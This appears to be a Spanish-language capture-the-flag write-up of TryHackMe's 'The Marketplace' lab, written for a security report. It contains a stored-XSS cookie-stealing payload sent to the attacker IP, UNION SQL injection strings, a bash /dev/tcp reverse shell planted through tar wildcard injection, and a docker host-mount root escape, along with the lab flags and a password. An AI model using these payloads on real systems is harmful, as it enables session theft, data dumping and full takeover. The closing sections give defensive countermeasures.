# RETO 1 — THE MARKETPLACE · Desarrollo técnico consolidado (REAL)

> Documento listo para pegar en el **apartado 6.1** del informe. Todos los datos son los obtenidos en la ejecución real del 14/11/2026. Reemplaza `mk-XX.png` por el nombre de tus capturas.

**Laboratorio:** TryHackMe – The Marketplace · **Enfoque:** Seguridad de aplicaciones web (Red Team)
**IP objetivo (sesión):** 10.64.178.136 (cambió de 10.64.185.69 tras reinicio) · **IP atacante (tun0):** 192.168.144.28
**Resultado:** Compromiso total (3/3 flags) — de usuario anónimo a **root**.

---

## Resumen ejecutivo del reto

Se comprometió por completo la plataforma de comercio electrónico encadenando cinco debilidades: **XSS almacenado** (robo de sesión del administrador por cookie sin `HttpOnly`), **SQL Injection** (exfiltración de credenciales desde la BD), **credenciales en texto claro** en mensajes internos, **configuración sudo insegura** combinada con **inyección de comodín en `tar`** (escalada a otro usuario) y **pertenencia al grupo docker** (escalada final a root). El impacto es la pérdida total de confidencialidad, integridad y disponibilidad del servidor.

---

## Flags obtenidas

| # | Ubicación | Vulnerabilidad que la permitió | Flag |
|---|-----------|-------------------------------|------|
| 1 | Panel de administración (`/admin`) | XSS almacenado + cookie sin HttpOnly | `THM{c37a63895910e478f28669b048c348d5}` |
| 2 | `/home/jake/user.txt` | SQL Injection → credenciales en mensaje | `THM{c3648ee7af1369676e3e4b15da6dc0b4}` |
| 3 | `/root/root.txt` | sudo + tar wildcard + grupo docker | `THM{d4f76179c80c0dcf46e0f8e43c9abd62}` |

---

## FASE 1 — Reconocimiento y enumeración

**Escaneo de puertos:**
```bash
nmap -sC -sV -p- -T4 -oN nmap-marketplace.txt 10.64.178.136
```
Resultado:
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | HTTP | nginx 1.19.2 |
| 32768/tcp | HTTP | Node.js (Express middleware) — app *The Marketplace* |

- `robots.txt` (en 80 y 32768) con **1 entrada denegada: `/admin`**.
- En la portada se enumeran dos usuarios publicadores: **michael** y **jake**.
📸 `mk-01-nmap.png`, `mk-02-home.png`

**Análisis de autenticación:** tras registrarse (`test:test123`) e iniciar sesión, la sesión se mantiene con una cookie **`token`** (JWT). El JWT **no tiene el flag `HttpOnly`** (legible desde JavaScript) y su *payload* expone en claro el campo `"admin"`:
```json
{"userId":4,"username":"test","admin":false,"iat":...}
```
📸 `mk-03-cookie-token.png`

---

## FASE 2 — Explotación controlada

### Hallazgo H-01a — XSS almacenado → robo de sesión del administrador
El campo **descripción** de un anuncio (`/new`) no sanitiza HTML/JS (XSS almacenado). La función **"Report listing to admins"** provoca que el administrador (michael) revise el anuncio, ejecutando el script en su navegador.

Listener en el atacante:
```bash
mkdir -p /tmp/xss && cd /tmp/xss && python3 -m http.server 8000
```
Payload en la descripción del anuncio (beacon que **no redirige**, para poder pulsar "Report"):
```html
<script>new Image().src='http://192.168.144.28:8000/?c='+document.cookie</script>
```
Tras reportar el anuncio, el listener recibe la cookie del administrador:
```
10.64.178.136 - - "GET /?c=token=eyJ...<JWT michael>... HTTP/1.1" 200
```
JWT decodificado: `{"userId":2,"username":"michael","admin":true}`
📸 `mk-04-xss-admin-token.png`

**Suplantación:** se reemplaza el valor de la cookie `token` por el JWT de michael (DevTools → Storage → Cookies) y se recarga → acceso como administrador.

**→ FLAG 1** en `/admin` (vista "User listing"): `THM{c37a63895910e478f28669b048c348d5}`
El panel además enumera los usuarios: `system(1)`, `michael(2, admin)`, **`jake(3, admin)`**, `test(4)`.
📸 `mk-05-flag1-admin.png`

### Hallazgo H-01b — SQL Injection (UNION, numérica) en `/admin?user=`
El parámetro `user` del panel admin es inyectable. Confirmación manual:
```
/admin?user=3-1   → muestra a michael (id 2)   ⇒ el servidor evaluó 3-1=2 en SQL
```
sqlmap fallaba por un filtro que devolvía 403 ante ciertos payloads, por lo que se explotó **manualmente con UNION** (4 columnas; la columna 2 se refleja como nombre de usuario):

Enumeración:
```
/admin?user=0 UNION SELECT 1,2,3,4-- -                                   (4 columnas; col2 = salida)
/admin?user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
   → items,messages,users
/admin?user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=0x6d65737361676573-- -
   → id,is_read,message_content,user_from,user_to
```
Volcado de mensajes:
```
/admin?user=0 UNION SELECT 1,group_concat(id,0x3a,user_from,0x3a,user_to,0x3a,message_content,0x7c),3,4 FROM messages-- -
```
Mensaje `id=1`, de `system(1)` a **`jake(3)`**:
> *"...your SSH password... Your new password is: **`@b_ENXkGYUCAv3zJ`**"*
📸 `mk-06-sqli-messages.png`

**Hallazgo H-01c — Credenciales en texto claro:** la contraseña SSH de jake viaja y se almacena en claro en un mensaje interno.

---

## FASE 3 — Acceso al sistema y escalada de privilegios

### Acceso como jake (FLAG 2)
```bash
ssh jake@10.64.178.136          # contraseña: @b_ENXkGYUCAv3zJ
id                               # uid=1000(jake) ... groups=1000(jake)   (NO está en docker)
cat user.txt                     # → FLAG 2: THM{c3648ee7af1369676e3e4b15da6dc0b4}
```
📸 `mk-07-ssh-jake-flag2.png`

### Hallazgo H-01d — sudo inseguro + tar wildcard injection (jake → michael)
```bash
sudo -l
# (michael) NOPASSWD: /opt/backups/backup.sh
cat /opt/backups/backup.sh
#   #!/bin/bash
#   echo "Backing up files ...";
#   tar cf /opt/backups/backup.tar *        ← comodín * = tar wildcard injection (GTFOBins)
```
El directorio `/opt/backups` es `drwxrwxrwt` (escribible). Se abusa del `*` creando ficheros con nombre de opciones de `tar`:
```bash
mkdir -p /tmp/privesc && cd /tmp/privesc
echo 'bash -i >& /dev/tcp/192.168.144.28/4445 0>&1' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"   # ojo: bash, no sh (dash falla con >&)
rm -f /opt/backups/backup.tar                         # el .tar previo era de jake e impedía a michael escribir
sudo -u michael /opt/backups/backup.sh                # dispara el exec como michael
```
Listener: `nc -lvnp 4445` → se recibe shell de **michael**:
```
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```
📸 `mk-08-tar-wildcard-michael.png`

### Hallazgo H-01e — Grupo docker (michael → root, FLAG 3)
michael pertenece al grupo **docker** (equivale a root). Con la imagen `alpine` ya presente se monta el disco del host:
```bash
docker images                                              # alpine, node, mysql, nginx, themarketplace_marketplace
docker run -v /:/mnt --rm alpine cat /mnt/root/root.txt    # → FLAG 3
```
**→ FLAG 3:** `THM{d4f76179c80c0dcf46e0f8e43c9abd62}`
📸 `mk-09-docker-root-flag3.png`

(Shell root real opcional: `docker run -v /:/mnt --rm alpine chroot /mnt bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"` y luego `/tmp/rootbash -p`.)

---

## Clasificación OWASP Top 10:2025 (verificar IDs oficiales)

| ID | Hallazgo | Categoría OWASP 2025 | Justificación |
|----|----------|----------------------|---------------|
| H-01a | XSS almacenado → robo de sesión | **Injection** (XSS) + **Identification & Authentication Failures** | Entrada no codificada ejecutada en el navegador del admin; cookie de sesión sin `HttpOnly` permite robarla. |
| H-01b | SQL Injection en `user` | **Injection** | Parámetro concatenado sin parametrizar; permite UNION y volcado de la BD. |
| H-01c | Credenciales en texto claro | **Cryptographic Failures** | Contraseña almacenada/transmitida sin cifrar en mensajes. |
| — | Acceso al panel admin / lectura de mensajes ajenos | **Broken Access Control** | Un usuario normal obtiene rol admin y lee datos de otros usuarios. |
| H-01d | sudo NOPASSWD + tar wildcard | **Security Misconfiguration** (CWE-78/CWE-732) | Permiso sudo sobre script con `*` explotable; directorio world-writable. |
| H-01e | Usuario en grupo docker | **Security Misconfiguration** / **Broken Access Control** (CWE-250) | Pertenencia al grupo docker = privilegios equivalentes a root. |

---

## Impacto y contramedidas (para Blue Team, riesgos y plan de tratamiento)

| Hallazgo | Impacto (CID) | Contramedida | Control ISO 27001:2022 |
|----------|---------------|--------------|------------------------|
| XSS + cookie sin HttpOnly | C:Alto I:Alto | Output encoding, **CSP**, cookies `HttpOnly`+`Secure` | A.8.28 Codificación segura |
| SQL Injection | C:Alto I:Medio | Consultas parametrizadas / ORM, WAF, mínimo privilegio en BD | A.8.28 / A.8.8 |
| Credenciales en claro | C:Alto | No almacenar secretos en claro; hashing/cifrado; rotación | A.5.17 / A.8.24 |
| sudo + tar wildcard | C/I/D:Alto | Evitar `*` en scripts privilegiados (rutas absolutas); revisar reglas sudo; quitar world-writable | A.8.2 Acceso privilegiado / A.8.9 Config |
| Grupo docker | C/I/D:Alto | Retirar usuarios del grupo docker; mínimo privilegio; rootless docker | A.5.15 / A.8.2 |

**Detección (Blue Team):** alertas por `<script>` en campos y violaciones CSP; logging de errores SQL y patrones `UNION/SELECT`; `fail2ban`/límite de intentos; `auditd` sobre `sudo` y binarios/scripts privilegiados; monitorizar uso del socket docker y creación de contenedores con `-v /`.

---

## Mapa a la matriz de riesgos (apartado 11 del informe)
- H-01a/H-01b → **R-02** (robo de sesión / acceso no autorizado) y **R-03** (SQLi / BD).
- H-01c → **R-05** (credenciales).
- H-01d/H-01e → **R-04** (escalada / configuración insegura).
